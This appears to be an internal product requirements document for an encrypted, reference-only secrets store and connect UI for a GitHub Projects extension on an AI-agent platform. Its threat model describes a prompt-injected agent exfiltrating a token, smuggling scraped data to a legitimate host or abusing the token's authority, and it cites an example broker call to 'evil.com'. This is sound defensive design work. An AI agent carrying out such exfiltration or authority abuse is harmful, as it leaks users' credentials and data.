# PRD — Extension Secrets capability + `github-projects` connect-UX (approach B)

- **Status:** github-projects extension BUILT + live-verified; secrets capability + UX-B DESIGNED (council-approved), NOT yet built.
- **Branch:** `feat/github-projects` (off `feat/visual-evidence-gate`; merge-base with `main` = `ee73f5ad`). Tip `19b04faf`. **Not pushed, no PR.**
- **Owner handoff:** this doc is self-contained — read it before touching code. Two LLM-Council verdicts are summarized below; **do not re-litigate the settled decisions.**
- **Date:** 2026-06-27.

---

## 1. Background — what already exists (do not rebuild)

A bundled **`github-projects`** extension was built by a 4-agent team and is fully integrated on `feat/github-projects`:

- Connect a **GitHub Projects v2 board per EZCorp project**; a card moving into a triggering column **proposes** (or, per-column opt-in, **auto-spawns**) a harness run; a Hub dashboard shows active/historical work; LLM tools add/remove/update tickets.
- **Architecture (council-locked, see §2):** outbound **poll daemon** (not webhook — NAT); **human-approval gate** by default (spawns pinned to a non-`yolo` PermissionMode); **host-side token broker** (token never enters the sandbox; board id always server-derived = confused-deputy fix); **DB unique `dedupe_key`** kills double-spawn; one board per project (`enabled=false` = pause).
- **State:** typecheck/lint/`gate-integrity` green; **360 tests pass**; **all 15 new source files at 100% line coverage** via the real `merge-lcov`. **Live-verified in dev** (`:3000`): migration ran, extension installed + boot-spawned, `GithubProjectsDaemon started`, GitHub egress 200, routes auth-gated, Hub renders.
- **Key files:**
  - `src/integrations/github-projects/{types,client,daemon,spawn,bus-registry}.ts`
  - `src/db/queries/github-projects.ts`, tables in `src/db/schema.ts` + inline in `src/db/migrate.ts` (doc mirror `src/db/migrations/add-github-projects.ts`)
  - `src/extensions/github-projects-handler.ts` (bundled-only reverse-RPC, routed in `tool-executor.ts`), registered in `bundled.ts` + `bundled-ceiling.ts` + `manifest.lock.json`
  - `docs/extensions/examples/github-projects/` (manifest, index, agent, tests)
  - web: `web/src/routes/api/integrations/github-projects/**`, connect page `web/src/routes/(app)/project/[id]/integrations/github-projects/+page.svelte`, nav link in `web/src/routes/(app)/+layout.svelte:230`, event in `web/src/lib/runtime-event-names.ts`

**Two problems with the current state that THIS PRD fixes:**
1. The GitHub PAT is stored bespoke: `encrypt()` under a string key `githubProjects:<projectId>:apiToken` in the shared global `settings` table. No scoping table, lifecycle, rotation, audit, or SDK surface.
2. The connect UI is a **new top-level nav item** ("GitHub Projects") + a bespoke `/project/[id]/integrations/...` route — which **deviates from the SDK pattern** (file-organizer/ez-code configure via Hub page + tools + global manifest `settings`; none add a nav item or `/project` route). Users expected it on the extension page and couldn't find it.

---

## 2. Prior council verdict (github-projects architecture) — SETTLED, for context

A 5-advisor LLM Council locked these (do not reopen): **poll not webhook**; **human-approval gate** (configurable per-board auto-spawn, never inherit `yolo`); **host-side encrypted token broker, projectId server-derived**; **dedupe-key DB unique constraint**; reject (for now) a generic multi-tracker engine / two-way board write-back / real webhook receiver.

---

## 3. This PRD's decisions — secrets capability + UX-B (council-approved 2026-06-27)

A second LLM Council (5 advisors + peer review + chairman) converged hard. **Settled decisions (do not re-litigate):**

### Access model — REFERENCE-ONLY, no plaintext to the sandbox
- The extension subprocess **never holds plaintext**. There is **no `ctx.secrets.get()`** that returns a secret — *"a `get()` that exists will be misused"* (logged while debugging, exfiltrated by a prompt-injected card-reader agent).
- The subprocess gets `ctx.secrets.has(name)` + a **host-mediated broker** call only.
- **Writes are host-route-only.** `ctx.secrets.set()` from the sandbox is *banned* — passing plaintext through reverse-RPC re-opens the exact leak. The connect UI POSTs to a host route; the sandbox carries plaintext in **neither** direction.
- **`envEscapeHatch`** (openai-image-gen-2 / ai-kit value-injection) stays **grandfathered legacy** — NOT generalized into `ctx.secrets`, and **no `unsafeInject`/`plaintext:true` flag** is added (the flag *is* the exfil vector and *will* be set).

### Storage — dedicated `extension_secrets` table (not shared `settings`)
- Scoped `(extensionId, projectId, userId?, name)`; `UNIQUE(extensionId, projectId, userId, name)` enforces isolation **at the index**, so cross-project/cross-extension bleed dies in the schema, not app logic.
- Ciphertext **AAD-bound to `(extensionId, projectId)`** (AES-GCM additional-authenticated-data) so a DB row-swap can't replay one scope's token under another.
- Metadata `createdAt/lastUsedAt/rotatedAt` + an audit stream.

### Key management — single master-key AES-256-GCM (ship it)
- KMS / per-secret DEKs / OS-keyring are the **over-engineering line** — the master key already shares the DB's trust boundary, so they reduce *zero* threat. Add AAD (free). Define a **documented master-key rotation procedure** (decrypt-all-old → re-encrypt-new, transactional); automation can be v1.1.

### Entry point + UX-B — password field on a host route, never chat
- Secret entry = `<input type=password>` → trusted `POST /api/extensions/[id]/secrets` (scope `extensions`). **Never** a chat tool (`connect_board(token)`) or Hub single-field prompt — those transit the LLM tool-call path and leak to the provider.
- **Remove the top-level nav item.** Reach the connect UI from the **extension detail page (`/extensions/[id]`)** + **Project Settings**. (Extension detail page is schema-driven via `SettingsPanel`/manifest `settings`; the per-project board+token can't live in manifest `settings` because those are global-per-user — hence a per-project surface linked from there.)

### The general broker (Stage 2) — manifest-pinned host + method + path
- `ctx.secrets.fetch(name, { path, method, body })` takes a **path**, not a URL; the host composes the final URL from a **manifest-pinned host**. Allowed **methods + path-prefixes are also manifest-pinned**, not call-time-chosen (closes `fetch("pat",{host:"evil.com"})`). Refuse redirects; rate-limit per-secret; never log the token/`Authorization`; debounce `lastUsedAt` (≤1/min).

### Honest threat framing (write this in the docs/UI, do not oversell)
> The secret is **never readable by the extension**, and its use is constrained to a pinned host + method + path set, rate-limited and audited.

It is **NOT** "exfil-proof." The broker **is egress**: a prompt-injected agent still controls request path/body and can smuggle stolen text *to the legitimate host* (e.g. POST a GitHub issue full of scraped data) or abuse the token's *authority* (delete repos). Reference-only is a large blast-radius **reduction, not elimination**. Document this residual risk so the next extension author doesn't treat the broker as a magic box.

---

## 4. Goals / Non-goals

**Goals**
- A reusable, secure **extension-secrets storage primitive** (table + host store + entry route).
- **De-bespoke github-projects:** migrate its token off the `settings` key onto the new store; handler/daemon read from the store.
- **UX-B:** remove the nav item; make the connect UI discoverable from the extension page + Project Settings; keep the password-field entry.

**Non-goals (this iteration)**
- The sandbox-facing `ctx.secrets.fetch` broker + manifest host/method/path pinning (Stage 2 — own PR + security review).
- Killing `envEscapeHatch` / migrating openai/ai-kit (those use stateful client SDKs a fetch-broker can't proxy — *right vision, wrong timeline*).
- KMS / DEKs / automated rotation / a "Connected Accounts" surface.

---

## 5. Scope — Stage 1 (BUILD NOW) vs Stage 2 (DEFER)

**Key insight:** github-projects already uses the **host-broker** pattern (daemon/handler make the GitHub calls host-side; the subprocess never touches the token). So github-projects needs only the **storage** half and is *strictly safer* than the general broker — the sandbox can't even invoke `fetch`, only the specific PDP-gated ticket verbs the handler implements. **Stage 1 adds no new sandbox attack surface.**

### Stage 1 (this PRD's build)
1. **`extension_secrets` table + migration** (inline in `src/db/migrate.ts` + doc mirror in `src/db/migrations/`, mirror Drizzle in `src/db/schema.ts`). Columns: `id, extension_id, project_id NULLABLE, user_id NULLABLE, name, ciphertext, created_at, last_used_at, rotated_at`; `UNIQUE(extension_id, project_id, user_id, name)`; FKs cascade on extension/project/user delete.
2. **Host secrets store** `src/extensions/secrets-store.ts` (host-only): `setSecret/getSecret/deleteSecret/hasSecret/listSecretMeta`, AAD-bound `encrypt/decrypt`, scope-keyed, writes audit rows, debounced `last_used_at`. **`getSecret` is host-only and never exposed to the sandbox.**
3. **Idempotent backfill** of `githubProjects:<projectId>:apiToken` → `extension_secrets` row (`extension_id='github-projects'`, `project_id=<id>`, `name='apiToken'`), then delete the old settings key. Note in the migration that the old key sat in broadly-readable `settings`.
4. **Entry route** `POST/DELETE /api/extensions/[id]/secrets` (scope `extensions`, authenticated, ownership-checked) — writes/clears a secret via the store. Never logs the value.
5. **github-projects read path:** `resolveAuth` in `github-projects-handler.ts` + the daemon read the token from the store (`getSecret('github-projects', projectId, 'apiToken')`) instead of `getSetting(githubTokenSettingKey(...))`. Delete `githubTokenSettingKey` usage. Disconnect/uninstall/project-delete must purge the secret (cascade + explicit).
6. **UX-B:** remove the `+layout.svelte:230` nav item; the connect page POSTs the token to the new secrets route (not the github-projects connect route's token field — or have connect call the store internally); add a discoverable entry from `/extensions/[id]` (a "Connect a board per project →" link/section) + Project Settings. Show a **masked** saved-state (`ghp_••••4f2a`), per-project framing, and rotate/revoke.

### Stage 2 (deferred — own PR + focused security review)
- `ctx.secrets.has` + host **fetch-broker** with manifest `permissions.secrets: { name, host, allow: [{ method, pathPrefix }], headerTemplate }`; redirect refusal; per-secret rate-limit; no-log; `has()` oracle mitigation. This is where the egress residual-risk lives.

---

## 6. Data model (Stage 1)

```sql
CREATE TABLE IF NOT EXISTS extension_secrets (
  id TEXT PRIMARY KEY,
  extension_id TEXT NOT NULL REFERENCES extensions(id) ON DELETE CASCADE,
  project_id   TEXT REFERENCES projects(id) ON DELETE CASCADE,   -- NULL = not project-scoped
  user_id      TEXT REFERENCES users(id) ON DELETE CASCADE,      -- NULL = not user-scoped
  name         TEXT NOT NULL,
  ciphertext   TEXT NOT NULL,            -- encrypt(plaintext, AAD=`${extension_id}:${project_id}`)
  created_at   TIMESTAMPTZ NOT NULL DEFAULT NOW(),
  last_used_at TIMESTAMPTZ,
  rotated_at   TIMESTAMPTZ
);
-- Scope isolation enforced at the index (NULLs need COALESCE or a partial-unique strategy):
CREATE UNIQUE INDEX IF NOT EXISTS idx_extension_secrets_scope
  ON extension_secrets (extension_id, COALESCE(project_id,''), COALESCE(user_id,''), name);
```
Audit: reuse the existing audit-log (`src/db/queries/audit-log.ts`) with SECRET_SET / SECRET_USED / SECRET_DELETED actions. **`encrypt()/decrypt()` must be extended to accept an AAD param** (or add `encryptWithAad`) — `src/providers/encryption.ts` is currently AAD-less and is `EXCLUDES`'d from coverage (in `src/providers/**`), so changes there don't fight the gate but DO need care (it's the master-key path).

---

## 7. Security model + residual risk (carry into code comments + docs)

- Reference-only; no `get()` to the sandbox; writes host-route-only; `envEscapeHatch` not generalized.
- AAD binds ciphertext to scope (anti row-swap). Scope from the **authenticated session**, never a subprocess-supplied id.
- Never log secrets or `Authorization` headers (watch `friendlyProviderError()` and any broker 401 path).
- Delete-on-disconnect / uninstall / project-delete with an audit line proving deletion.
- **Residual (document, don't hide):** the broker is egress; reference-only stops *theft*, not *authority-abuse* or *response-channel exfil*. Stage 2 must pin method+path and rate-limit.

---

## 8. Build order + acceptance

**Order:** (1) table + migration + backfill → (2) host secrets store (+ AAD encrypt) → (3) entry route → (4) github-projects read-path swap + purge-on-delete → (5) UX-B (remove nav item, extension-page/Project-Settings entry, masked state) → (6) e2e + `@evidence`.

**Acceptance criteria**
- github-projects token lives in `extension_secrets` (AAD-bound); the old `settings` key is gone after backfill; disconnect/uninstall/project-delete purge it (proven by an integration test).
- Subprocess has **no** way to read the token (no `get`, no sandbox `set`); only the host handler/daemon read it.
- Connect UI works from the extension page + Project Settings; **no top-level nav item**; token entered via password field → host route; saved state shown masked.
- github-projects still: connects board #3, polls, proposes, approves → spawns a non-`yolo` run, tools mutate tickets — all green end-to-end.
- 100% line coverage on every new source file; `gate-integrity` green; e2e + `@evidence` for the connect UI.

---

## 9. Gotchas / constraints (these bit us — heed them)

- **Worktree isolation (binding):** spawn build agents with `isolation: "worktree"`; never let them edit the primary tree. Land a Phase-0 contract (types + table + queries + stubs) first so parallel agents don't collide. Partition files so no two agents edit the same file → conflict-free merge.
- **Bun coverage-attribution drift:** large `bun:test` suites + **multi-line template literals or multi-line generic type annotations inside function bodies/signatures** make Bun emit unstable per-line `DA:` records → the file false-drops below 100%. **Fix = hoist them to module-level** (`const QUERY = \`…\``; `type Patch = Partial<Pick<…>>`). Splitting the test file does NOT help. (We hit this in `client.ts` and `queries.ts`.)
- **Coverage shard registration (CODEOWNERS):** `scripts/test.sh` + `scripts/test-coverage.sh` only `find src/__tests__` (+ docs/examples + web import). Tests next to source (`src/integrations/**/__tests__`, `src/extensions/__tests__`, `web/src/routes/**/__tests__`) run **nowhere** in CI until added to those scripts. **Keep integration tests OUT of the coverage leg** (they load real modules → denominator pollution); they run in `test.sh`. Add a `coverage-thresholds.json` key per new file. All three are CODEOWNERS-owned (`@arch1tect0x`) — edits are *required + strengthening* (gate-integrity allows added keys/shards) but need maintainer review.
- **Never weaken the gate:** no lowered thresholds, no new `EXCLUDES`, no `.skip/.only`, no assertion-free tests (blocked by `gate-integrity`; bypass label is maintainer-only).
- **Dev container:** `ez-corp-ai-app-1` on `:3000` (host-net), external Postgres `:5432` (`DATABASE_URL`), bind-mounts `./src`/`./docs`/`./web/src`; vite SSR re-evaluates backend modules so migration/`ensureBundledExtensions`/daemon pick up changes on file save. No `gh`/`curl` in the container → **PAT mode only**. Dev login: `test@test.com` / `Test123!`. Mint an API key in-container: `await initDb(); mintApiKeyForUser(userId, ["read","chat","extensions"], "...")`.
- **Hub render** route: `GET /api/hub/pages/ext:github-projects:dashboard` (scope `read`).

---

## 10. Reference — council artifacts

Both council runs (advisor responses + peer reviews + chairman) are in this session's workflow transcripts. Key precedent for the **reference-only/brokered** model already in the codebase: `ctx.llm.complete()` ("the token NEVER enters the sandbox"), `ctx.search` (`"inherit"`), `ctx.memory`, `ctx.lessons` — all host-brokered caps in `ExtensionPermissions` (`src/extensions/types.ts`). The closest BYOK precedent (the *legacy* inject pattern Stage 1 does NOT follow) is `web/src/lib/server/security/openai-extension-creds.ts`.
